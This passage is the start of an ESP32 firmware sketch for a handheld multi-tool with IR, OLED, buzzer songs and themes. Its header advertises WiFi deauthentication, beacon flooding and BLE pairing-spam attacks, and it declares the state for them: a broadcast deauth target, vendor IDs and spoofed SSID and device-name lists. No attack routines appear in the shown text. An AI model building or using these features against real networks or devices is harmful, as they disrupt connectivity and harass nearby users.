/*
 * ZWISSER ZERO OS V4 - BLUETOOTH CONTROL + WiFi Config + HACKY FEATURES + THEMES + SYSTEM STATS + IR ENGINE + IR REMOTES + OLED DISPLAY
 * Board: ESP32-S3-Zero
 * 
 * HACKY FEATURES:
 *   - WiFi Deauth Attack (rate control, reason codes, all-channels)
 *   - WiFi Beacon Flood (encryption spoofing: OPEN/WPA2/WPA3/WPA2-ENT, random SSIDs)
 *   - WiFi Probe Sniffer (live captured device monitoring)
 *   - WiFi Channel Hopping (cycle channels for attacks)
 *   - Apple AirTag Spam (BLE)
 *   - Samsung SmartTag Spam (BLE)
 *   - Microsoft Swift Pair Spam (BLE)
 *   - Google Fast Pair Spam (Android pairing popups)
 *   - Apple iBeacon Spam
 *   - Google Eddystone URL Spam
 *   - BLE Pair Spam Flood (random company IDs)
 *   - BLE Name Randomizer (random device names)
 * 
 * FEATURES:
 *   - Persistent WiFi station (remembers last connected network)
 *   - 8 Cool themes (Matrix, Cyberpunk, Hacker, Deep Blue, Synthwave, Blood Dragon, Night Vision, Ghost)
 *   - Live System Stats (Temperature, CPU Freq, RAM, PSRAM, WiFi RSSI)
 *   - Ultra Pro Max IR Engine (Gree AC, raw capture/blast)
 *   - IR Remotes Manager (custom remote profiles with buttons, persisted via LittleFS)
 *   - Signals Manager (saved IR signals library with add/rename/delete/blast/search)
 *   - 0.96" OLED Display (128x64 landscape, U8g2, 400KHz I2C)
 *   - 5-Way Navigation Switch (UP/DOWN/LEFT/RIGHT/CENTER)
 *   - Comprehensive Menu System with Screensaver
 */

#include <WiFi.h>
#include <WebServer.h>
#include <NimBLEDevice.h>
#include <Preferences.h>
#include <esp_wifi.h>
#include <esp_mac.h>
#include <esp_system.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>
#include <ir_Gree.h>
#include <ir_Coolix.h>
#include <ir_Haier.h>
#include <ir_Kelvinator.h>
#include <irac.h>
#include <LittleFS.h>
#include <U8g2lib.h>
#include <Wire.h>
#include <ArduinoJson.h>
// temperatureRead() is built into Arduino ESP32 core
#define DEFAULT_AP_SSID "ZWISSER_ZERO_V4"
#define DEFAULT_AP_PASS "zwissorzero"
#define BT_DEVICE_NAME "ZWISSER-ZERO"
#define MAX_LOG_LINES 50
#define MAX_PAIRED_DEVICES 20
#define MAX_BEACON_NAMES 30
#define MAX_PROBE_RESULTS 80
#define DEAUTH_PACKET_LEN 26
#define BEACON_PACKET_LEN 512
#define BLE_SPAM_INTERVAL_MS 30
#define AIRTAG_MFG_ID 0x004C
#define SAMSUNG_MFG_ID 0x0075
#define MSFT_MFG_ID 0x0006
#define GOOGLE_MFG_ID 0x00E0
#define APPLE_IBEACON_MFG_ID 0x004C
#define EDDYSTONE_MFG_ID 0x00E0
#define MAX_CHANNELS 13
#define MAX_THEMES 8
#define IR_RECEIVE_PIN 4
#define IR_SEND_PIN 5

// ===================== BUTTON GPIOs ========================
#define BTN_UP     12
#define BTN_DOWN   9
#define BTN_LEFT   6
#define BTN_RIGHT  11
#define BTN_CENTER 10
#define BTN_DEBOUNCE_MS 50

// ===================== OLED DISPLAY ========================
#define OLED_SDA 7
#define OLED_SCL 8
#define BUZZER_PIN 13           // passive buzzer on GPIO 6
#define OLED_DIM_MS 10000      // dim after 10s
#define OLED_OFF_MS 20000      // off after 20s
#define OLED_CONTRAST_NORMAL 255
#define OLED_CONTRAST_DIM 32
#define OLED_MAX_ITEMS 5       // max items visible on screen  
#define OLED_TOP_BAR_H 10      // top bar height (rows 0-14, separator at 15)
#define OLED_BOTTOM_BAR_Y 56   // bottom bar separator Y
#define OLED_BOTTOM_TEXT_Y 63  // bottom text Y
#define OLED_CONTENT_Y 17      // content start Y (below top bar + separator)
#define OLED_CONTENT_H 40      // content height = 64 - 15 - 1 - 1 - 8 = 39
#define OLED_ICON_H 10         // icon height in pixels
#define OLED_ROW_H 9           // row height in pixels
#define OLED_LIST_W 128        // list width
#define BATTERY_ADC_PIN 1      // GPIO1 for battery voltage divider input
#define BATTERY_READ_INTERVAL 5000 // read battery every 5 seconds

// ===================== MUSIC / BUZZER ========================
// Note frequencies (Hz)
#define NOTE_B0  31
#define NOTE_C1  33
#define NOTE_CS1 35
#define NOTE_D1  37
#define NOTE_DS1 39
#define NOTE_E1  41
#define NOTE_F1  44
#define NOTE_FS1 46
#define NOTE_G1  49
#define NOTE_GS1 52
#define NOTE_A1  55
#define NOTE_AS1 58
#define NOTE_B1  62
#define NOTE_C2  65
#define NOTE_CS2 69
#define NOTE_D2  73
#define NOTE_DS2 78
#define NOTE_E2  82
#define NOTE_F2  87
#define NOTE_FS2 93
#define NOTE_G2  98
#define NOTE_GS2 104
#define NOTE_A2  110
#define NOTE_AS2 117
#define NOTE_B2  123
#define NOTE_C3  131
#define NOTE_CS3 139
#define NOTE_D3  147
#define NOTE_DS3 156
#define NOTE_E3  165
#define NOTE_F3  175
#define NOTE_FS3 185
#define NOTE_G3  196
#define NOTE_GS3 208
#define NOTE_A3  220
#define NOTE_AS3 233
#define NOTE_B3  247
#define NOTE_C4  262
#define NOTE_CS4 277
#define NOTE_D4  294
#define NOTE_DS4 311
#define NOTE_E4  330
#define NOTE_F4  349
#define NOTE_FS4 370
#define NOTE_G4  392
#define NOTE_GS4 415
#define NOTE_A4  440
#define NOTE_AS4 466
#define NOTE_B4  494
#define NOTE_C5  523
#define NOTE_CS5 554
#define NOTE_D5  587
#define NOTE_DS5 622
#define NOTE_E5  659
#define NOTE_F5  698
#define NOTE_FS5 740
#define NOTE_G5  784
#define NOTE_GS5 831
#define NOTE_A5  880
#define NOTE_AS5 932
#define NOTE_B5  988
#define NOTE_C6  1047
#define NOTE_CS6 1109
#define NOTE_D6  1175
#define NOTE_DS6 1245
#define NOTE_E6  1319
#define NOTE_F6  1397
#define NOTE_FS6 1480
#define NOTE_G6  1568
#define NOTE_GS6 1661
#define NOTE_A6  1760
#define NOTE_AS6 1865
#define NOTE_B6  1976
#define NOTE_C7  2093
#define NOTE_CS7 2217
#define NOTE_D7  2349
#define NOTE_DS7 2489
#define NOTE_E7  2637
#define NOTE_F7  2794
#define NOTE_FS7 2960
#define NOTE_G7  3136
#define NOTE_GS7 3322
#define NOTE_A7  3520
#define NOTE_AS7 3729
#define NOTE_B7  3951
#define NOTE_C8  4186
#define NOTE_CS8 4435
#define NOTE_D8  4699
#define NOTE_DS8 4978
#define PAUSE    0

// Song structure: { frequency, duration_ms }
// PAUSE (0) = rest note
struct SongNote {
  uint16_t freq;
  uint16_t dur;
};

// Mario Theme (Full) - Complete Ground Theme + Underground + Star Power medley
const SongNote songMario[] = {
  // === OVERWORLD / GROUND THEME (Part 1) ===
  {NOTE_E5, 150}, {NOTE_E5, 150}, {0, 150}, {NOTE_E5, 150}, {0, 150}, {NOTE_C5, 150}, {NOTE_E5, 150}, {0, 150},
  {NOTE_G5, 150}, {0, 300}, {NOTE_G4, 150}, {0, 300},
  
  {NOTE_C5, 150}, {0, 300}, {NOTE_G4, 150}, {0, 300}, {NOTE_E4, 150}, {0, 300},
  {NOTE_A4, 150}, {0, 150}, {NOTE_B4, 150}, {0, 150}, {NOTE_AS4, 150}, {NOTE_A4, 150},
  
  // The fast triplet run
  {NOTE_G4, 100}, {NOTE_E5, 100}, {NOTE_G5, 100}, 
  {NOTE_A5, 150}, {0, 150}, {NOTE_F5, 150}, {NOTE_G5, 150}, 
  {0, 150}, {NOTE_E5, 150}, {0, 150}, {NOTE_C5, 150}, {NOTE_D5, 150}, {NOTE_B4, 150}, {0, 300},

  // === OVERWORLD / GROUND THEME (Part 2 - Descending Line) ===
  {NOTE_C5, 150}, {0, 300}, {NOTE_G4, 150}, {0, 300}, {NOTE_E4, 150}, {0, 300},
  {NOTE_A4, 150}, {0, 150}, {NOTE_B4, 150}, {0, 150}, {NOTE_AS4, 150}, {NOTE_A4, 150},
  
  {NOTE_G4, 100}, {NOTE_E5, 100}, {NOTE_G5, 100}, 
  {NOTE_A5, 150}, {0, 150}, {NOTE_F5, 150}, {NOTE_G5, 150}, 
  {0, 150}, {NOTE_E5, 150}, {0, 150}, {NOTE_C5, 150}, {NOTE_D5, 150}, {NOTE_B4, 150}, {0, 300},

  // === BRIDGE TO UNDERGROUND ===
  {NOTE_G5, 150}, {NOTE_FS5, 150}, {NOTE_F5, 150}, {NOTE_DS5, 150}, {0, 150}, {NOTE_E5, 150}, 
  {0, 150}, {NOTE_GS4, 150}, {NOTE_A4, 150}, {NOTE_C5, 150}, {0, 150}, {NOTE_A4, 150}, {NOTE_C5, 150}, {NOTE_D5, 150},
  {0, 450},

  // === UNDERGROUND THEME (Bassline groove transposed for melody) ===
  {NOTE_C4, 150}, {NOTE_A3, 150}, {NOTE_A4, 150}, {NOTE_AS3, 150}, {NOTE_AS4, 150}, {0, 300},
  {NOTE_C4, 150}, {NOTE_A3, 150}, {NOTE_A4, 150}, {NOTE_AS3, 150}, {NOTE_AS4, 150}, {0, 300},
  {NOTE_F3, 150}, {NOTE_D3, 150}, {NOTE_D4, 150}, {NOTE_DS3, 150}, {NOTE_DS4, 150}, {0, 300},
  {NOTE_F3, 150}, {NOTE_D3, 150}, {NOTE_D4, 150}, {NOTE_DS3, 150}, {NOTE_DS4, 150}, {0, 150},
  {NOTE_DS4, 150}, {NOTE_D4, 150}, {NOTE_CS4, 150}, {NOTE_C4, 300}, {0, 450},

  // === STAR POWER / INVINCIBILITY THEME ===
  {NOTE_C5, 150}, {0, 150}, {NOTE_C5, 150}, {0, 150}, {NOTE_C5, 150}, {NOTE_D5, 150}, {NOTE_E5, 150}, {0, 150},
  {NOTE_F5, 150}, {0, 150}, {NOTE_F5, 150}, {0, 150}, {NOTE_F5, 150}, {NOTE_E5, 150}, {NOTE_D5, 150}, {0, 150},
  {NOTE_C5, 150}, {0, 150}, {NOTE_C5, 150}, {0, 150}, {NOTE_C5, 150}, {0, 150}, {NOTE_B4, 150}, {NOTE_G4, 150},
  {NOTE_C5, 150}, {0, 150}, {NOTE_B4, 150}, {0, 150}, {NOTE_A4, 150}, {0, 150}, {NOTE_G4, 150}, {0, 150},

  // === FINAL RE-ENTRY FLOURISH ===
  {NOTE_E5, 100}, {NOTE_G5, 100}, {NOTE_A5, 100}, 
  {NOTE_F5, 150}, {NOTE_G5, 150}, {0, 150}, {NOTE_E5, 150}, {0, 150}, 
  {NOTE_C5, 150}, {NOTE_D5, 150}, {NOTE_B4, 150}, {0, 600}
};

// Harry Potter - Hedwig's Theme (Full) - Complete with bridge and conclusion
const SongNote songHarryPotter[] = {
  // === Main Theme (A section - calliope intro) ===
  {NOTE_G4, 400}, {NOTE_C5, 400}, {NOTE_E5, 200}, {NOTE_F5, 200}, {NOTE_E5, 200},
  {NOTE_G5, 400}, {NOTE_E5, 400}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_B4, 400}, {0, 200},
  {NOTE_G4, 400}, {NOTE_C5, 400}, {NOTE_E5, 200}, {NOTE_F5, 200}, {NOTE_E5, 200},
  {NOTE_G5, 400}, {NOTE_E5, 400}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_AS4, 400}, {0, 200},
  {NOTE_A4, 400}, {NOTE_D5, 400}, {NOTE_F5, 200}, {NOTE_G5, 200}, {NOTE_F5, 200},
  {NOTE_A5, 400}, {NOTE_F5, 400}, {NOTE_D5, 200}, {NOTE_E5, 200},
  {NOTE_C5, 400}, {0, 400},
  // === Repeat with variation ===
  {NOTE_G4, 350}, {NOTE_C5, 350}, {NOTE_E5, 200}, {NOTE_F5, 200}, {NOTE_E5, 150},
  {NOTE_G5, 350}, {NOTE_E5, 350}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_B4, 350}, {0, 200},
  {NOTE_G4, 350}, {NOTE_C5, 350}, {NOTE_E5, 200}, {NOTE_F5, 200}, {NOTE_E5, 150},
  {NOTE_G5, 350}, {NOTE_E5, 350}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_AS4, 350}, {0, 200},
  // === Bridge (B section - darker turn) ===
  {NOTE_F4, 300}, {NOTE_AS4, 300}, {NOTE_CS5, 200}, {NOTE_DS5, 200}, {NOTE_F5, 300},
  {NOTE_DS5, 200}, {NOTE_CS5, 200}, {NOTE_AS4, 300}, {NOTE_F4, 150}, {NOTE_G4, 150},
  {NOTE_AS4, 300}, {NOTE_CS5, 200}, {NOTE_DS5, 200}, {NOTE_F5, 300},
  {NOTE_DS5, 200}, {NOTE_F5, 200}, {NOTE_CS5, 300}, {0, 200},
  // === Return to main theme (final) ===
  {NOTE_G4, 400}, {NOTE_C5, 400}, {NOTE_E5, 200}, {NOTE_F5, 200}, {NOTE_E5, 200},
  {NOTE_G5, 400}, {NOTE_E5, 400}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_B4, 400}, {0, 200},
  // === Coda (conclusion) ===
  {NOTE_C5, 600}, {NOTE_B4, 200}, {NOTE_C5, 200}, {NOTE_D5, 400},
  {NOTE_G4, 600}, {0, 400},
  {0, 500} // end
};
// Star Wars - Imperial March (Full) - Complete Darth Vader theme
const SongNote songImperialMarch[] = {
  // === Main Theme (A section - first phrase) ===
  {NOTE_G4, 400}, {NOTE_G4, 400}, {NOTE_G4, 400}, {NOTE_DS4, 250}, {NOTE_AS4, 100},
  {NOTE_G4, 250}, {NOTE_DS4, 100}, {NOTE_AS4, 100}, {NOTE_G4, 800},
  // === Main Theme (A section - second phrase) ===
  {NOTE_D5, 400}, {NOTE_D5, 400}, {NOTE_D5, 400}, {NOTE_DS5, 250}, {NOTE_AS4, 100},
  {NOTE_G4, 250}, {NOTE_DS4, 100}, {NOTE_AS4, 100}, {NOTE_G4, 800},
  // === Repeat first phrase (with emphasis) ===
  {NOTE_G4, 350}, {NOTE_G4, 350}, {NOTE_G4, 350}, {NOTE_DS4, 200}, {NOTE_AS4, 100},
  {NOTE_G4, 200}, {NOTE_DS4, 100}, {NOTE_AS4, 100}, {NOTE_G4, 700},
  // === Bridge (B section - middle section) ===
  {NOTE_F4, 200}, {NOTE_F4, 200}, {NOTE_F4, 300},
  {NOTE_DS4, 150}, {NOTE_G4, 150}, {NOTE_AS4, 150}, {NOTE_G4, 150}, {NOTE_DS4, 150},
  {NOTE_F4, 300}, {NOTE_DS4, 150}, {NOTE_G4, 150}, {NOTE_AS4, 150}, {NOTE_G4, 150}, {NOTE_DS4, 150},
  {NOTE_F4, 300}, {NOTE_DS4, 100}, {NOTE_G4, 100}, {NOTE_AS4, 100}, {NOTE_G4, 100},
  {NOTE_G4, 400}, {NOTE_G4, 400}, {NOTE_G4, 400},
  // === Return to main theme ===
  {NOTE_G4, 400}, {NOTE_G4, 400}, {NOTE_G4, 400}, {NOTE_DS4, 250}, {NOTE_AS4, 100},
  {NOTE_G4, 250}, {NOTE_DS4, 100}, {NOTE_AS4, 100}, {NOTE_G4, 800},
  // === Final dramatic hit ===
  {NOTE_G5, 600}, {NOTE_DS5, 200}, {NOTE_AS4, 200}, {NOTE_G4, 1000},
  {0, 500} // end
};
// Tetris - Korobeiniki (Full) - Complete Russian folk song
const SongNote songTetris[] = {
  // === Verse 1 (A section) ===
  {NOTE_E5, 200}, {NOTE_B4, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_C5, 200}, {NOTE_B4, 200}, {NOTE_A4, 200},
  {NOTE_A4, 200}, {NOTE_C5, 200}, {NOTE_E5, 200}, {NOTE_D5, 200},
  {NOTE_C5, 200}, {NOTE_B4, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_E5, 200}, {NOTE_C5, 200}, {NOTE_A4, 200}, {NOTE_A4, 200},
  {0, 200}, {NOTE_D5, 200}, {NOTE_F5, 200}, {NOTE_A5, 200},
  {NOTE_G5, 200}, {NOTE_F5, 200}, {NOTE_E5, 200},
  {NOTE_C5, 200}, {NOTE_E5, 200}, {NOTE_D5, 200}, {NOTE_C5, 200},
  {NOTE_B4, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_E5, 200}, {NOTE_C5, 200}, {NOTE_A4, 200}, {NOTE_A4, 200},
  // === Verse 2 (A section variation) ===
  {NOTE_E5, 180}, {NOTE_B4, 180}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_C5, 180}, {NOTE_B4, 180}, {NOTE_A4, 200},
  {NOTE_A4, 200}, {NOTE_C5, 200}, {NOTE_E5, 180}, {NOTE_D5, 200},
  {NOTE_C5, 180}, {NOTE_B4, 180}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_E5, 180}, {NOTE_C5, 180}, {NOTE_A4, 200}, {NOTE_A4, 200},
  // === Bridge (B section - higher octave) ===
  {NOTE_E5, 200}, {NOTE_G5, 200}, {NOTE_E5, 200}, {NOTE_F5, 200},
  {NOTE_E5, 200}, {NOTE_D5, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_E5, 200}, {NOTE_D5, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_E5, 200}, {NOTE_C5, 200}, {NOTE_A4, 300}, {0, 200},
  // === Return to Verse 1 ===
  {NOTE_E5, 200}, {NOTE_B4, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_C5, 200}, {NOTE_B4, 200}, {NOTE_A4, 200},
  {NOTE_A4, 200}, {NOTE_C5, 200}, {NOTE_E5, 200}, {NOTE_D5, 200},
  {NOTE_C5, 200}, {NOTE_B4, 200}, {NOTE_C5, 200}, {NOTE_D5, 200},
  {NOTE_E5, 200}, {NOTE_C5, 200}, {NOTE_A4, 300},
  // === Final finish ===
  {NOTE_E5, 400}, {NOTE_A4, 600},
  {0, 500} // end
};
// Nokia Ringtone (Extended) - Complete with bridge and repeat
const SongNote songNokia[] = {
  // === Main Theme (A section) ===
  {NOTE_E5, 200}, {NOTE_D5, 200}, {NOTE_FS4, 400}, {NOTE_GS4, 400},
  {NOTE_CS5, 200}, {NOTE_B4, 200}, {NOTE_D4, 400}, {NOTE_E4, 400},
  {NOTE_B4, 200}, {NOTE_A4, 200}, {NOTE_CS4, 400}, {NOTE_E4, 400},
  {NOTE_A4, 400},
  // === Repeat with subtle variation ===
  {NOTE_E5, 180}, {NOTE_D5, 180}, {NOTE_FS4, 350}, {NOTE_GS4, 350},
  {NOTE_CS5, 200}, {NOTE_B4, 200}, {NOTE_D4, 350}, {NOTE_E4, 350},
  {NOTE_B4, 180}, {NOTE_A4, 180}, {NOTE_CS4, 350}, {NOTE_E4, 350},
  {NOTE_A4, 600},
  // === Bridge (B section - octave shift) ===
  {NOTE_C5, 200}, {NOTE_B4, 200}, {NOTE_D4, 300}, {NOTE_E4, 300},
  {NOTE_G4, 200}, {NOTE_FS4, 200}, {NOTE_A3, 300}, {NOTE_B3, 300},
  {NOTE_E4, 200}, {NOTE_D4, 200}, {NOTE_FS3, 300}, {NOTE_GS3, 300},
  {NOTE_CS4, 300}, {NOTE_B3, 200}, {NOTE_A3, 200},
  // === Return to main theme ===
  {NOTE_E5, 200}, {NOTE_D5, 200}, {NOTE_FS4, 400}, {NOTE_GS4, 400},
  {NOTE_CS5, 200}, {NOTE_B4, 200}, {NOTE_D4, 400}, {NOTE_E4, 400},
  {NOTE_B4, 200}, {NOTE_A4, 200}, {NOTE_CS4, 400}, {NOTE_E4, 400},
  {NOTE_A4, 600},
  {0, 500} // end
};
// Für Elise (Beethoven - Extended) - Complete with second theme
const SongNote songFurElise[] = {
  // === MAIN THEME (Part 1) ===
  {NOTE_E5, 150}, {NOTE_DS5, 150},
  {NOTE_E5, 150}, {NOTE_DS5, 150}, {NOTE_E5, 150}, {NOTE_B4, 150}, {NOTE_D5, 150}, {NOTE_C5, 150},
  {NOTE_A4, 450}, {NOTE_C4, 150}, {NOTE_E4, 150}, {NOTE_A4, 150},
  {NOTE_B4, 450}, {NOTE_E4, 150}, {NOTE_GS4, 150}, {NOTE_B4, 150},
  {NOTE_C5, 450}, {0, 150}, {NOTE_E5, 150}, {NOTE_DS5, 150},
  
  // === MAIN THEME (Repetition) ===
  {NOTE_E5, 150}, {NOTE_DS5, 150}, {NOTE_E5, 150}, {NOTE_B4, 150}, {NOTE_D5, 150}, {NOTE_C5, 150},
  {NOTE_A4, 450}, {NOTE_C4, 150}, {NOTE_E4, 150}, {NOTE_A4, 150},
  {NOTE_B4, 450}, {NOTE_E4, 150}, {NOTE_C5, 150}, {NOTE_B4, 150},
  {NOTE_A4, 450}, {0, 150},

  // === THE SEVENTH BAR TRANSITION (Often confused for Section B) ===
  {NOTE_B4, 150}, {NOTE_C5, 150}, {NOTE_D5, 150},
  {NOTE_E5, 450}, {NOTE_G4, 150}, {NOTE_F5, 150}, {NOTE_E5, 150},
  {NOTE_D5, 450}, {NOTE_F4, 150}, {NOTE_E5, 150}, {NOTE_D5, 150},
  {NOTE_C5, 450}, {NOTE_E4, 150}, {NOTE_D5, 150}, {NOTE_C5, 150},
  {NOTE_B4, 300}, {0, 150}, {NOTE_E4, 150}, {NOTE_E5, 150}, {0, 150}, 
  {NOTE_E5, 150}, {NOTE_E6, 150}, {0, 150}, {NOTE_DS5, 150}, {NOTE_E5, 300}, 
  {NOTE_DS5, 150}, {NOTE_E5, 150}, {NOTE_DS5, 150}, {NOTE_E5, 150}, {NOTE_DS5, 150},

  // === RETURN OF MAIN THEME ===
  {NOTE_E5, 150}, {NOTE_DS5, 150}, {NOTE_E5, 150}, {NOTE_B4, 150}, {NOTE_D5, 150}, {NOTE_C5, 150},
  {NOTE_A4, 450}, {NOTE_C4, 150}, {NOTE_E4, 150}, {NOTE_A4, 150},
  {NOTE_B4, 450}, {NOTE_E4, 150}, {NOTE_GS4, 150}, {NOTE_B4, 150},
  {NOTE_C5, 450}, {0, 150}, {NOTE_E5, 150}, {NOTE_DS5, 150},

  // === FINAL REPETITION & ARPEGGIO CLOSURE ===
  {NOTE_E5, 150}, {NOTE_DS5, 150}, {NOTE_E5, 150}, {NOTE_B4, 150}, {NOTE_D5, 150}, {NOTE_C5, 150},
  {NOTE_A4, 450}, {NOTE_C4, 150}, {NOTE_E4, 150}, {NOTE_A4, 150},
  {NOTE_B4, 450}, {NOTE_E4, 150}, {NOTE_C5, 150}, {NOTE_B4, 150},
  
  // Arpeggiated ending resolving to A Minor
  {NOTE_A4, 300}, {NOTE_E5, 300}, {NOTE_A5, 600}, 
  {0, 900} // End rest
};

// Song metadata
const char* songNames[] = {
  "Super Mario",
  "Harry Potter",
  "Imperial March",
  "Tetris",
  "Nokia Ringtone",
  "Fur Elise"
};
const SongNote* songs[] = {
  songMario, songHarryPotter, songImperialMarch, songTetris, songNokia, songFurElise
};
const int songCount = 6;

WebServer server(80);
Preferences prefs;

String apSsid = DEFAULT_AP_SSID;
String apPass = DEFAULT_AP_PASS;
String btName = BT_DEVICE_NAME;
String staSsid = "";
String staPass = "";
int themeIndex = 0;
bool btEnabled = false;
bool wifiEnabled = false;
bool nimbleInitialized = false;
bool btAdvertising = false;

NimBLEServer* pServer = nullptr;
NimBLEAdvertising* pAdvertising = nullptr;
NimBLEService* pService = nullptr;
NimBLECharacteristic* pCharacteristic = nullptr;

// ===================== IR ENGINE GLOBALS ======================
IRsend irsend(IR_SEND_PIN);
IRrecv irrecv(IR_RECEIVE_PIN);
IRGreeAC greeAC(IR_SEND_PIN);
IRCoolixAC coolixAC(IR_SEND_PIN);
IRHaierAC haierAC(IR_SEND_PIN);
IRHaierAC haierAC160(IR_SEND_PIN);
IRKelvinatorAC kelvinatorAC(IR_SEND_PIN);
IRac irac(IR_SEND_PIN);
decode_results irResults;
uint16_t *lastRawBuf = nullptr;
uint16_t lastRawLen = 0;
unsigned long irRecordStart = 0;
bool irReadingRaw = false; // true when 10-second record window is active

// ===================== REMOTES STORAGE ========================
String remotesJson = "{}";

// ===================== SIGNALS LIBRARY ========================
String signalsJson = "[]";

// ===================== RANDOM NAME LISTS =====================
const char* randomBtNames[] = {
  "iPhone", "iPhone 15 Pro", "Galaxy S24", "Pixel 8", "AirPods Pro",
  "Galaxy Buds", "MacBook Pro", "iPad Air", "Surface Pro", "ThinkPad X1",
  "LG TV", "Samsung TV", "Sony WH-1000XM5", "Bose QC45", "JBL Flip 6",
  "Xbox Controller", "PS5 DualSense", "Nintendo Switch", "Amazon Echo", "Google Nest",
  "Fitbit Versa", "Apple Watch", "Galaxy Watch", "Tile Mate", "Samsung Fridge"
};

const char* randomSsids[] = {
  "Starbucks WiFi", "Free Airport WiFi", "AndroidAP", "iPhone Hotspot",
  "HOME-5G", "WiFi-2.4G", "NETGEAR42", "Linksys007", "ATT-WiFi", "Xfinity",
  "FBI Surveillance Van", "NSA Tracking Unit", "Police WiFi", "Moscow Free",
  "Pretty Fly for a WiFi", "TellMyWiFiLoveHer", "Wu-Tang LAN", "Skynet",
  "HackMeMaybe", "FreePublicWiFi", "Guest Network", "IoT Network"
};

// ===================== THEME DATA (compact) ===================
// Each theme: name, bg, fg, accent, accent2(red), accent3(orange), accent4(purple), border, cardBg, dim
const char themeData[MAX_THEMES][10][16] PROGMEM = {
  {"Matrix","#000","#0F0","#0F0","#F00","#FF6600","#AA00FF","#222","#0a0a0a","#555"},
  {"Cyberpunk","#0a0015","#FF00FF","#00FFFF","#FF0044","#FF8800","#8800FF","#331045","#150025","#888"},
  {"Hacker","#1a0d00","#FFB000","#FFB000","#FF3300","#FF6600","#B06000","#3a2d10","#1f1200","#886644"},
  {"Deep Blue","#000511","#00CCFF","#00AAFF","#FF0044","#FF8800","#6600FF","#002244","#001020","#446688"},
  {"Synthwave","#0d0015","#FF44FF","#00FFCC","#FF0044","#FFCC00","#FF44FF","#2a1140","#180020","#8866AA"},
  {"Blood Dragon","#0d0000","#FF2200","#FF0044","#FF0000","#FF4400","#880022","#331111","#180505","#664444"},
  {"Night Vision","#001505","#33FF33","#00FF44","#FF0033","#FF8800","#00FF88","#002210","#001505","#446644"},
  {"Ghost","#111","#CCCCCC","#00AAFF","#FF3333","#FF8800","#AA44FF","#333","#1a1a1a","#666"}
};

// ===================== BUTTON STATE ========================
bool btnUpState = HIGH, btnDownState = HIGH, btnLeftState = HIGH, btnRightState = HIGH, btnCenterState = HIGH;
bool btnUpLast = HIGH, btnDownLast = HIGH, btnLeftLast = HIGH, btnRightLast = HIGH, btnCenterLast = HIGH;
unsigned long btnUpDebounce = 0, btnDownDebounce = 0, btnLeftDebounce = 0, btnRightDebounce = 0, btnCenterDebounce = 0;

// Extra button flags for edge detection
bool btnUpPressed = false, btnDownPressed = false, btnLeftPressed = false, btnRightPressed = false, btnCenterPressed = false;

// Left button hold-to-back tracking
unsigned long btnLeftHoldStart = 0;
bool btnLeftHeld = false;
#define BTN_LEFT_HOLD_MS 1000

// ===================== HACKY STATE ==========================
bool deauthRunning = false;
bool beaconRunning = false;
bool probeSniffing = false;
bool airtagSpamRunning = false;
bool smarttagSpamRunning = false;
bool swiftpairSpamRunning = false;
bool googleFastPairRunning = false;
bool ibeaconRunning = false;
bool eddystoneRunning = false;
bool bleSpamRunning = false;
bool bleNameRandomizerRunning = false;
bool channelHoppingRunning = false;
bool irReading = false;
bool tvbgoneRunning = false;
bool coolBeGoneRunning = false;

String lastIrProtocol = "Unknown";
String lastIrValue = "0";
int lastIrBits = 0;

String beaconPrefix = "ZWISSER";
int beaconCount = 8;
int deauthChannel = 1;
int deauthRate = 50; // ms between packets
int deauthReason = 7;
bool deauthAllChannels = false;
bool beaconRandomSsids = false;
String beaconEncryption = "OPEN";
uint8_t deauthTarget[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
uint8_t deauthAP[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
uint8_t currentHopChannel = 1;

String probeResults[MAX_PROBE_RESULTS];
int probeResultCount = 0;
uint8_t beaconMacBase[6] = {0xDE,0xAD,0xBE,0xEF,0x00,0x00};

// ===================== LOG BUFFER ==========================
String logBuffer[MAX_LOG_LINES];
int logIndex = 0;
int logCount = 0;

// ===================== MUSIC STATE ==========================
bool musicPlaying = false;
int musicSongIndex = 0;
int musicNoteIndex = 0;
unsigned long lastMusicTick = 0;

// ===================== FREQ TESTER STATE ====================
uint16_t testFrequency = 2000;
bool isBuzzerPlaying = false;

// ===================== OLED ICONS (XBM 12x12) ==================
// Each icon is 12 bits wide, padded to 16 bits per row = 2 bytes per row, 12 rows = 24 bytes
// WiFi STA icon - signal bars (connected)
static const unsigned char icon_wifi_sta_on[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x18, 0x06, 0x04, 0x08,
  0x02, 0x10, 0x02, 0x10, 0x00, 0x00, 0xC0, 0x00, 0x40, 0x00, 0x00, 0x00
};
// WiFi STA icon - signal bars (disconnected/outline)
static const unsigned char icon_wifi_sta_off[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x18, 0x06, 0x04, 0x08,
  0x02, 0x10, 0x02, 0x10, 0x00, 0x00, 0xC0, 0x00, 0x40, 0x00, 0x00, 0x00
};
// WiFi AP icon - antenna with waves
static const unsigned char icon_ap_on[] PROGMEM = {
  0x10, 0x00, 0x38, 0x00, 0x7C, 0x00, 0xFE, 0x00, 0x38, 0x00, 0x38, 0x00,
  0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x38, 0x00, 0x10, 0x00, 0x00, 0x00
};
// WiFi AP icon - antenna off
static const unsigned char icon_ap_off[] PROGMEM = {
  0x10, 0x00, 0x38, 0x00, 0x7C, 0x00, 0xFE, 0x00, 0x38, 0x00, 0x38, 0x00,
  0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x38, 0x00, 0x10, 0x00, 0x00, 0x00
};
